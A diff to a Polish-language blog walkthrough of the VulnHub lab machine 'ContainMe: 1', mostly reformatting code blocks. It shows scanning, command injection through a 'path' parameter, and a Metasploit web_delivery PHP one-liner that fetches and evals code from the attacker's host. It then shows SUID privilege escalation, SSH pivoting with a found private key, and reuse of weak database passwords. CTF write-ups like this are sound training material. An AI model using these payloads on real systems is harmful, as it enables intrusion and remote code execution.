@@ -21,8 +21,17 @@ gallery2_3:
   - url: /assets/images/hacking/2021/08/03.png
     image_path: /assets/images/hacking/2021/08/03.png
 ---
+
+|:----|:----|
+|Nazwa:|ContainMe: 1|
+|Autor:|[it-security-works](https://www.vulnhub.com/author/it-security-works,811/)|
+|Wypuszczony:|29.07.2021|
+|Do ściągnięcia:|[Stąd](https://www.vulnhub.com/entry/containme-1,729/) - Vulnhub|
+|Poziom:|Łatwy|
+|Nauczysz się:|Metasploit, LXD|
+
 # Wstęp
-[ContainMe: 1](https://www.vulnhub.com/entry/containme-1,729/) jest obrazem z lipca 2021 roku. Nazwa obrazu (**THM-ContainMe-v4.ova**) wskazuje czwartą werjsę(?). Na chwilę obecną (12.08.2021) nie znalazłem żadnej solucji, więc nie było podpowiedzi. **ContainMe: 1**, jak nazwa wskazuje, jest to pierwsza maszyna z [serii ContainMe](https://www.vulnhub.com/series/containme,490/). Autorem jest [IT Security Works](https://www.vulnhub.com/author/it-security-works,811/).
+[ContainMe: 1](https://www.vulnhub.com/entry/containme-1,729/) jest obrazem z lipca 2021 roku. Nazwa obrazu (**THM-ContainMe-v4.ova**) wskazuje czwartą wersję(?). Na chwilę obecną (12.08.2021) nie znalazłem żadnej solucji, więc nie było podpowiedzi. **ContainMe: 1**, jak nazwa wskazuje, jest to pierwsza maszyna z [serii ContainMe](https://www.vulnhub.com/series/containme,490/). Autorem jest [IT Security Works](https://www.vulnhub.com/author/it-security-works,811/).
 {: .text-justify}
 ## Zaczynamy
 Standardowo na początku użyjemy <mark>Nmapa</mark> w <mark>Metasploicie</mark>:
@@ -38,8 +47,8 @@ db_nmap -A -p- 172.16.1.218
 ## WWW
 Widzimy trochę portów. Dwa z nich to **SSH**. Tym zajmiemy się później. Na początku jak zwykle sprawdźmy **WWW**. <mark>Dirb</mark> to nam pokazał:
 {: .text-justify}
-```console
-root@kali:/home/szikers# dirb http://172.16.1.218/
+```bash
+# root@kali:/home/szikers# dirb http://172.16.1.218/
 
 -----------------
 DIRB v2.22
@@ -59,7 +68,7 @@ GENERATED WORDS: 4612
 + http://172.16.1.218/index.php (CODE:200|SIZE:329)
 + http://172.16.1.218/info.php (CODE:200|SIZE:69012)
 ```
-To wystarczy, więcej nie trzeba skanować. W **index.html** jest zwykła strona **Debiana**. W **info.php** jest informacja o Apache, PHP i przy tym dowiadujemy się, że strona stoi na kontenerze LXD:
+To wystarczy, więcej nie trzeba skanować. W **index.html** jest zwykła strona **Debian**a. W **info.php** jest informacja o **Apache**, **PHP** i przy tym dowiadujemy się, że strona stoi na kontenerze **LXD**:
 {: .text-justify}
 <div class="notice--primary" markdown="1">
 http://172.16.1.218/info.php
@@ -73,10 +82,8 @@ http://172.16.1.218/index.php
 </div>
 "Poffuzujmy" trochę i sprawdźmy jak **http://172.16.1.218/index.php** się zachowa z parametrem:
 {: .text-justify}
-```console
-wfuzz  --filter 'h!=329' -c -w /usr/share/dirb/wordlists/common.txt  http://172.16.1.218/index.php?FUZZ=a
-
-root@kali:/home/szikers/Containme-1# wfuzz  --filter 'h!=329' -c -w /usr/share/dirb/wordlists/common.txt  http://172.16.1.218/index.php?FUZZ=a
+```bash
+# wfuzz  --filter 'h!=329' -c -w /usr/share/dirb/wordlists/common.txt  http://172.16.1.218/index.php?FUZZ=a
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
 ********************************************************
@@ -94,7 +101,8 @@ Parametr **path** ma inną ilość znaków niż inne. **PHP** odwołuje się do 
 {: .text-justify}
 <div class="notice--primary" markdown="1">
 http://172.16.1.218/index.php?path=/
-```html
+<pre>
+<p style="background-color:white;">
 	total 72K
 drwxr-xr-x  22 root   root    4.0K Jul 15 09:33 .
 drwxr-xr-x  22 root   root    4.0K Jul 15 09:33 ..
@@ -118,13 +126,15 @@ dr-xr-xr-x  13 nobody nogroup    0 Aug 11 08:23 sys
 drwxrwxrwt   8 root   root    4.0K Aug 12 13:09 tmp
 drwxr-xr-x  11 root   root    4.0K Jun 29 03:03 usr
 drwxr-xr-x  14 root   root    4.0K Jul 15 17:11 var	
-```
+</p>
+</pre>
 </div>
 Możemy wyświetlić katalog. Sprawdźmy czy jest podatność przez **Code injection**:
 {: .text-justify}
 <div class="notice--primary" markdown="1">
 http://172.16.1.218/index.php?path=/;echo;id
-```html
+<pre>
+<p style="background-color:white;">
 	total 72K
 drwxr-xr-x  22 root   root    4.0K Jul 15 09:33 .
 drwxr-xr-x  22 root   root    4.0K Jul 15 09:33 ..
@@ -150,7 +160,8 @@ drwxr-xr-x  11 root   root    4.0K Jun 29 03:03 usr
 drwxr-xr-x  14 root   root    4.0K Jul 15 17:11 var
 
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
-```
+</p>
+</pre>
 </div>
 Maszyna jest podatna. Czas tam wejść. Do tego użyjemy <mark>Metasploita</mark>:
 {: .text-justify}
@@ -174,13 +185,15 @@ msf6 exploit(multi/script/web_delivery) > [*] Using URL: http://0.0.0.0:8080/xIX
 [*] Run the following command on the target machine:
 php -d allow_url_fopen=true -r "eval(file_get_contents('http://172.16.1.10:8080/xIXYouzGVsN', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"
 ```
-Należy kod, co poda nam Metasploit wrzucic jako parametr w linku. W moim wypadku jest taki. U was zapewn będzie inny:
+Należy kod, co poda nam **Metasploit** wrzucic jako parametr w linku. W moim wypadku jest taki. U was zapewn będzie inny:
 {: .text-justify}
 <div class="notice--primary" markdown="1">
 php -d allow_url_fopen=true -r "eval(file_get_contents('http://172.16.1.10:8080/xIXYouzGVsN', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"
-```bash
+<pre>
+<p style="background-color:white;">
 http://172.16.1.218/index.php?path=/;php -d allow_url_fopen=true -r "eval(file_get_contents('http://172.16.1.10:8080/xIXYouzGVsN', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"
-```
+</p>
+</pre>
 </div>
 Mamy sesję:
 {: .text-justify}
@@ -215,9 +228,9 @@ www-data@host1:/var/www/html$ python3 -c 'import pty;pty.spawn("/bin/bash")'
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 Możemy trochę pogrzebać w **Shellu**:
-```console
-www-data@host1:/var/www/html$ cat /etc/passwd
-cat /etc/passwd
+{: .text-justify}
+```bash
+# www-data@host1:/var/www/html$ cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -233,7 +246,7 @@ proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
 www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
 backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
 list:x:38:38:Mailing
- List Manager:/var/list:/usr/sbin/nologin
+List Manager:/var/list:/usr/sbin/nologin
 irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
 gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
 nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
@@ -248,6 +261,7 @@ pollinate:x:108:1::/var/cache/pollinate:/bin/false
 mike:x:1001:1001::/home/mike:/bin/bash
 ```
 Mała uwaga: zamiast używać komendy **shell** w **Meterpreterze**, lepiej wpisać **shell -t**.
+{: .text-justify}
 {: .notice--warning}
 
 ### 1cryptupx
@@ -289,10 +303,8 @@ www-data@host1:/home/mike$
 ```
 Jest to **Shell**, który działa z hasłem **mike**. Nic to nam nie daję, jesteśmy przecież na **Shellu** z id 33. Poszukajmy plików z **Suid**:
 {: .text-justify}
-```console
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-www-data@host1:/home/mike$ find / -perm -4000 2>/dev/null
-find / -perm -4000 2>/dev/null
+```bash
+# www-data@host1:/home/mike$ find / -perm -4000 2>/dev/null
 /usr/share/man/zh_TW/crypt
 /usr/bin/newuidmap
 /usr/bin/newgidmap
@@ -316,8 +328,9 @@ find / -perm -4000 2>/dev/null
 www-data@host1:/home/mike$
 ```
 **/usr/share/man/zh_TW/crypt** jest to identyczny plik, co u nas w katalogu, z tą różnicą, że ma **Suida**:
-```console
-www-data@host1:/usr/share/man/zh_TW$ ./crypt mike
+
+```bash
+# www-data@host1:/usr/share/man/zh_TW$ ./crypt mike
 ./crypt mike
 ░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
 ██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
@@ -334,9 +347,8 @@ uid=0(root) gid=33(www-data) groups=33(www-data)
 ### Nmap
 No i mamy **Root**a. Skoro jesteśmy na kontenerze, to sprawdźmy interfejsy sieciowe:
 {: .text-justify}
-```console
-root@host1:/usr/share/man/zh_TW# ifconfig
-ifconfig
+```bash
+# root@host1:/usr/share/man/zh_TW# ifconfig
 eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 192.168.250.10  netmask 255.255.255.0  broadcast 192.168.250.255
         inet6 fe80::216:3eff:fe9c:ff0f  prefixlen 64  scopeid 0x20<link>
@@ -366,10 +378,11 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
 ```
 Zainstalujmy <mark>Nmapa</mark> i przeskanujmy interfejs **eth1**:
 {: .text-justify}
-<mark>Nmap</mark> instalujemy z konta root
+<mark>Nmap</mark> instalujemy z konta **root**:
+{: .text-justify}
 {: .notice--danger}
-```console
-nmap -sn 172.16.20.0/24
+```bash
+# nmap -sn 172.16.20.0/24
 
 Starting Nmap 7.60 ( https://nmap.org ) at 2021-08-11 15:30 CDT
 Nmap scan report for host1 (172.16.20.2)
@@ -379,8 +392,9 @@ Host is up (0.00014s latency).
 Nmap done: 256 IP addresses (2 hosts up) scanned in 3.04 seconds 
 ```
 **172.16.20.6** się pinguje. Pewnie to drugi kontener. Sprawdźmy co na nim jest:
-```console
-nmap -A 172.16.20.6
+{: .text-justify}
+```bash
+# nmap -A 172.16.20.6
 
 Starting Nmap 7.60 ( https://nmap.org ) at 2021-08-11 15:32 CDT
 Nmap scan report for 172.16.20.6
@@ -395,15 +409,13 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 
 ```
 Jest **SSH**, ale nie znamy hasła, za możemy znaleźć klucz:
-```console
-root@host1:/usr/share/man/zh_TW# find / -name id_rsa 2>/dev/null
-find / -name id_rsa 2>/dev/null
+```bash
+# root@host1:/usr/share/man/zh_TW# find / -name id_rsa 2>/dev/null
 /home/mike/.ssh/id_rsa
 ```
 ## host2
-```console
-root@host1:/usr/share/man/zh_TW# ssh -i /home/mike/.ssh/id_rsa mike@172.16.20.6
-<_TW# ssh -i /home/mike/.ssh/id_rsa mike@172.16.20.6
+```bash
+# root@host1:/usr/share/man/zh_TW# ssh -i /home/mike/.ssh/id_rsa mike@172.16.20.6
 Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-147-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -425,22 +437,19 @@ mike@host2:~$
 ```
 Sprawdźmy jakie mamy usługi:
 {: .text-justify}
-```console
-mike@host2:~$ ss -tuln
-ss -tuln
+```bash
+# mike@host2:~$ ss -tuln
 Netid  State    Recv-Q   Send-Q      Local Address:Port     Peer Address:Port
 udp    UNCONN   0        0           127.0.0.53%lo:53            0.0.0.0:*
 tcp    LISTEN   0        80              127.0.0.1:3306          0.0.0.0:*
 tcp    LISTEN   0        128         127.0.0.53%lo:53            0.0.0.0:*
 tcp    LISTEN   0        128               0.0.0.0:22            0.0.0.0:*
 tcp    LISTEN   0        128                  [::]:22               [::]:*
-
 ```
 Nic podatnego nie znalazłem na tym serwerze. Jedyne co zostało to <mark>MySql</mark>. Więc to raczej było to. Hasło raczej musiało być proste. Nie było to **mike**, ale hasłem było **password** :smiley:
 {: .text-justify}
-```console
-mike@host2:~$ mysql -umike -ppassword
-mysql -umike -ppassword
+```bash
+# mike@host2:~$ mysql -umike -ppassword
 mysql: [Warning] Using a password on the command line interface can be insecure.
 Welcome to the MySQL monitor.  Commands end with ; or \g.
 Your MySQL connection id is 26
@@ -496,9 +505,8 @@ select * from users;
 
 mysql>
 ```
-```console
-mike@host2:~$ su root
-su root
+```bash
+# mike@host2:~$ su root
 Password: bjsig4868fgjjeog
 ```
 W katalogu root był spakowany plik zipem. Hasło do pliku wcześniej znaleźliśmy w bazie. Po rozpakowaniu pliku zdobyliśmy flagę.
